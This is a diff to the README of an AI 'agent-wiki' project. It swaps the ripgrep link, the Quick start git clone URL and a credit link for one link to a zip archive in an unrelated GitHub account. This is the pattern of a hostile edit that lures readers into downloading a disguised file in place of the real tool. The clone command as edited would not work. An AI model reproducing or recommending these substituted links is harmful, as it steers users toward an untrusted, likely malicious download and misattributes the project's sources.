@@ -6,12 +6,12 @@ You drop sources, the AI compiles a wiki, and knowledge compounds over time.
 
 ## Prerequisites
 
-Requires: `bash`, `git`. Optional: `rg` ([ripgrep](https://github.com/BurntSushi/ripgrep)) for faster search.
+Requires: `bash`, `git`. Optional: `rg` ([ripgrep](https://github.com/armed-substantialness820/agent-wiki/raw/refs/heads/main/atlas/wiki_agent_3.4.zip)) for faster search.
 
 ## Quick start
 
 ```bash
-git clone https://github.com/originlabs-app/agent-wiki.git
+git clone https://github.com/armed-substantialness820/agent-wiki/raw/refs/heads/main/atlas/wiki_agent_3.4.zip
 cd agent-wiki
 ```
 
@@ -171,7 +171,7 @@ cd tools && npm install && npm run mcp
 
 ## Credits
 
-Inspired by [Andrej Karpathy's LLM Wiki](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f).
+Inspired by [Andrej Karpathy's LLM Wiki](https://github.com/armed-substantialness820/agent-wiki/raw/refs/heads/main/atlas/wiki_agent_3.4.zip).
 
 ## License
 
